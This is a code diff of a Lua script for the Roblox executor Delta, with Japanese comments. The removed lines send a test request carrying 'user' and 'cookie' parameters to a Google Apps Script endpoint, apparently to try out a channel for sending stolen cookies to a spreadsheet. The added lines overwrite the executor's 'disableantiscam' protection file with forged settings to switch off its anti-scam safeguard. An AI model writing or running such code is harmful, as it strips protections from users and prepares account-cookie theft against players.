@@ -1,14 +1,17 @@
 local path = "Internals/Secured/disableantiscam"
-local s, content = pcall(function() return readfile(path) end)
+local correctId = "93156578936" -- ここをお前が見つけたIDにする
 
-if s then
-    print("✅ Deltaはこのファイルを認識してるぜ！")
-    print("中身の一部: " .. tostring(content):sub(1, 20))
-    
-    -- 通信テスト
-    local url = "https://script.google.com/macros/s/AKfycbySRD9waGQTePiZTsX8BWorkMt4lAtYDaMuUpX6763Yrguz04Ws7Cd6B4TiibPEu1R6/exec"
-    game:HttpGet(url .. "?user=FINAL_CHECK&cookie=CHECKING_COMMUNICATION")
-    print("🚀 GASにテスト信号を送った。シートを確認しろ！")
+-- 書き換える内容（JSON形式）
+local newData = '{\n  "allowed_games": "*",\n  "user_id": "' .. correctId .. '",\n  "version_num": 707\n}'
+
+-- 実行！
+local success, err = pcall(function()
+    writefile(path, newData)
+end)
+
+if success then
+    print("✅ 書き換え完了！これでもう名前を戻す必要もねえ。")
+    print("一度Robloxを再起動して設定を反映させろ！")
 else
-    print("❌ まだファイルを認識できてねえ。名前かパスが間違ってるぜ。")
+    warn("❌ 書き換え失敗: " .. tostring(err))
 end
